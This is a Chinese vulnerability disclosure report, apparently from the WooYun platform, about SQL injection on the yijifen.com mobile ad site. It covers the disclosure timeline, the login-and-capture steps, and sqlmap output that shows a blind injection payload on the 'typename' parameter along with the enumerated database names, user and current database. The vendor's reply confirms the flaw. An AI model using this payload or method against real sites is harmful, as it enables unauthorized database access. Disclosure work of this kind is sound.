wybug_title: 亿玛某旗下网站主站存在sql注入
wybug_detail:
漏洞详情 披露状态：   									2015-11-29：	细节已通知厂商并且等待厂商处理中									2015-11-30：	厂商已经确认，细节仅向厂商公开									2015-12-10：	细节向核心白帽子及相关领域专家公开									2015-12-20：	细节向普通白帽子公开									2015-12-30：	细节向实习白帽子公开									2016-01-14：	细节向公众公开  简要描述： 请看报道易积分是亿玛创新网络（天津）有限公司旗下的手机移动广告平台，秉承亿玛创新网络（天津）有限公司的效果营销理念，易积分平台为数以万计的广告主提供基于效果付费的移动广告投放，同时为广大手机应用开发者创造良好而稳定的移动广告收益 详细说明：  地址：http://www.yijifen.com/  先注册个账号登录进入之后

如图，点查询按钮抓包

sqlmap identified the following injection point(s) with a total of 41 HTTP(s) requests:---Parameter: typename (POST)    Type: boolean-based blind    Title: MySQL >= 5.0 boolean-based blind - Parameter replace    Payload: app_id=1&typename=(SELECT (CASE WHEN (3896=3896) THEN 3896 ELSE 3896*(SELECT 3896 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))---back-end DBMS: MySQL 5.0available databases [8]:[*] dbaadmin[*] eqile[*] escore[*] information_schema[*] luckcat[*] mysql[*] performance_schema[*] testsqlmap resumed the following injection point(s) from stored session:---Parameter: typename (POST)    Type: boolean-based blind    Title: MySQL >= 5.0 boolean-based blind - Parameter replace    Payload: app_id=1&typename=(SELECT (CASE WHEN (3896=3896) THEN 3896 ELSE 3896*(SELECT 3896 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))---back-end DBMS: MySQL 5.0No tables foundsqlmap resumed the following injection point(s) from stored session:---Parameter: typename (POST)    Type: boolean-based blind    Title: MySQL >= 5.0 boolean-based blind - Parameter replace    Payload: app_id=1&typename=(SELECT (CASE WHEN (3896=3896) THEN 3896 ELSE 3896*(SELECT 3896 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))    Vector: (SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))---back-end DBMS: MySQL 5.0current user:    'ddcddd@%'sqlmap resumed the following injection point(s) from stored session:---Parameter: typename (POST)    Type: boolean-based blind    Title: MySQL >= 5.0 boolean-based blind - Parameter replace    Payload: app_id=1&typename=(SELECT (CASE WHEN (3896=3896) THEN 3896 ELSE 3896*(SELECT 3896 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))    Vector: (SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))---back-end DBMS: MySQL 5.0current database:    'escore'   漏洞证明：  地址：http://www.yijifen.com/  先注册个账号登录进入之后

wybug_reply: 漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-11-30 17:33 厂商回复： 感谢提供信息，我们紧急修复 最新状态： 暂无
